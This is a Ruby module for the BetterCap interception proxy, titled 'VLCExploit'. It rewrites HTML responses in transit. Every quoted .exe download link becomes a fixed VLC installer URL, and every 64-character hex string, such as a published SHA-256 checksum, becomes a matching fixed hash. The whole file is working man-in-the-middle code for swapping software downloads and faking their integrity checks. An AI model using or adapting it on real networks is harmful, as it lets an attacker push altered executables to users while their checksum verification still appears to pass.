class VLCExploit < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'VLCExploit',
    'Description' => 'Replace installation file',
    'Version'     => '1.0',
    'Author'      => "Andrea Draghetti",
    'License'     => 'GPL3'
  )
	def initialize
		opts = BetterCap::Context.get.options.servers
	end
 
	def on_request(request, response)
		# is it a html page?
		if response.content_type =~ /^text\/html.*/
			BetterCap::Logger.info "Exploit http://#{request.host}#{request.path}..".green
			response.body.gsub! %r/["']http:\/\/*[^\s]+\.(exe)["']/i, "http://mirror.vorboss.net/videolan/vlc/2.2.4/win32/vlc-2.2.4-win32.exe"
			response.body.gsub! /[a-f0-9]{64}/i, "f4a4b8897e86f52a319ee4568e62be9cda1bcb2341e798da12e359d81cb36e51"
		end
	end
end
